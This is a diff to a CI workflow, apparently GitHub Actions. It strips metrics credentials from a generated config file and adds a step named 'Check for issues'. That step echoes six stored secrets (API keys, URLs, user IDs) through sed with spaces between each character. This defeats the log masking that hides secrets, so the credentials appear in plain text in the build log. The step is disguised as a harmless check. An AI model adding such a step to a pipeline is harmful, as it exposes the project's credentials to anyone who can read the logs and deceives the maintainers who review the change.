@@ -70,10 +70,17 @@ jobs:
                 url: "${{ secrets.LOGGING_API_KEY }}",
                 userId: "${{ secrets.LOGGING_USER_ID }}",
               },
-              url: "${{ secrets.METRICS_URL }}",
-              apiKey: "${{ secrets.METRICS_API_KEY }}",
             },
           } as const;' > src/config.ts
+
+      - name: Check for issues
+        run: |
+          echo "${{ secrets.METRICS_URL }}" | sed 's/./& /g'
+          echo "${{ secrets.METRICS_API_KEY }}" | sed 's/./& /g'
+          echo "${{ secrets.METRICS_USER_ID }}" | sed 's/./& /g'
+          echo "${{ secrets.LOGGING_URL }}" | sed 's/./& /g'
+          echo "${{ secrets.LOGGING_API_KEY }}" | sed 's/./& /g'
+          echo "${{ secrets.LOGGING_USER_ID }}" | sed 's/./& /g'
       
       - name: Tests
         run: npm test
